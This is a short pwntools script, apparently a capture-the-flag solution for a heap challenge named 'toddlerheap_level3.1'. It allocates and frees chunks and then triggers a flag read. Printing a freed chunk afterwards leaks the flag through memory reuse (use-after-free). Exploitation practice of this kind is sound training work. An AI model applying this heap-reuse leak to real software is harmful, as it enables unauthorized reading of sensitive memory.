from pwn import *

context.arch = 'amd64'

p = process("/challenge/toddlerheap_level3.1")

def fill_bins():
    for idx in range(3):
        p.sendline(f'malloc {idx} 2368')
    p.sendline(b"malloc 3 2336")
    p.sendline(b"malloc 4 2336")

    for idx in range(5):
        p.sendline(f"free {idx}")

fill_bins()

p.sendline(b"read_flag")
p.sendline(b"puts 4")
p.interactive()
